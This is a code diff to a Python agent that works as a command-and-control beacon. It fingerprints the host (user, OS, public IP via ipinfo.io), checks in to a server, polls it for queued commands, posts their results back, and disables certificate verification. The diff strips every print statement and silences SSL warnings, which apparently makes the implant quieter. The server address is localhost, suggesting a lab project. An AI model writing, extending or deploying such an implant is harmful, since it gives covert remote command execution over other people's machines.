@@ -5,16 +5,15 @@ import subprocess
 import sys
 import random
 import sys
-
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) ## this is to disable ssl warnings
 class Agent(object):
 
 	url = "https://127.0.0.1:9000/"
-	random_num = random.randint(100,90000)
+	random_num = random.randint(1000,90000)
 	user_result = subprocess.run(["whoami"],capture_output=True).stdout.decode("utf-8").rstrip()
 	os_result = subprocess.run(["uname","-a"],capture_output=True).stdout.decode("utf-8").rstrip()
 	ip_result = subprocess.run(["curl","ipinfo.io/ip"],capture_output=True).stdout.decode("utf-8").rstrip()
-	####
-	#payload = "{\"agent_id\": \"{}\",\n\t\"os\": \"Windows\",\n\t\"ip\": \"0.0.0.0\",\n\t\"user\": \"guest\",\n\t\"completed_commands\": [],\n\t\"pending_commands\": []\n}".format(random_num)
 	payload = {"agent_id":"{}".format(random_num),"os":"{}".format(os_result),"ip":"{}".format(ip_result),"user":"{}".format(user_result),"completed_commands":[],"pending_commands":[]}
 	payload = json.dumps(payload)
 	headers = {
@@ -24,9 +23,6 @@ class Agent(object):
 	}
 
 	
-	#response = requests.request("POST", url, headers=headers, data = payload)
-	#response_json = response.json()
-
 
 	def first_checkin(self):
 		url = self.url + 'first_check_in'
@@ -36,7 +32,6 @@ class Agent(object):
 		self.rev_num = self.response_json['rev']
 		self.access_token = self.response_json['token']
 		self.refresh_token = self.response_json['refresh']
-		print(self.response_json)
 		return
 
 	def check(self):
@@ -44,7 +39,6 @@ class Agent(object):
 		headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
 		response = requests.request("GET",url,headers=headers,verify=False)
 		response_json = dict(response.json())
-		print(response_json)
 		self.updated_payload = response_json
 		if response_json['pending_commands']: 
 			self.cmd = response_json['pending_commands'][0]
@@ -60,13 +54,11 @@ class Agent(object):
 					self.access_token = resp['token'] ## new token
 					return True
 				except:
-					print("couldnt refresh token")
 					return False
 			except:
 				self.cmd_result = {self.cmd:"Error running command"}
 				return True
 		else:
-			print("no command")
 			### Requesting new token ###
 			refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
 			resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
@@ -79,11 +71,8 @@ class Agent(object):
 		url = self.url + "poll"
 		self.updated_payload['pending_commands'].remove(self.cmd) ## removes pending command[0] 
 		self.updated_payload['completed_commands'].append(self.cmd_result)
-		print(self.updated_payload)
 		headers = {"Content-Type":"application/json","doc_id":self.doc_id, "Authorization":"Bearer {}".format(self.access_token)}
 		response = requests.request("POST",url,headers=headers,data=json.dumps(self.updated_payload),verify=False,)
-		print(response.text)
-		print("completed post to database")
 
 
 	def refresh_token(self):
@@ -91,7 +80,6 @@ class Agent(object):
 		refresh_url = self.url + "refresh"
 		resp = requests.request("GET",refresh_url,headers=refresh_header,verify=False,)
 		resp_json = resp.json()
-		print(resp_json['token'])
 		return resp_json['token']
 
 
@@ -102,9 +90,8 @@ class Agent(object):
 			sleep(10)
 			if agent.check():
 				agent.post_complete_command()
-				print("posted to database")
 			else:
-				print("no commands found")
+				sleep(1)
 
 if __name__ == "__main__":
     Agent().main()
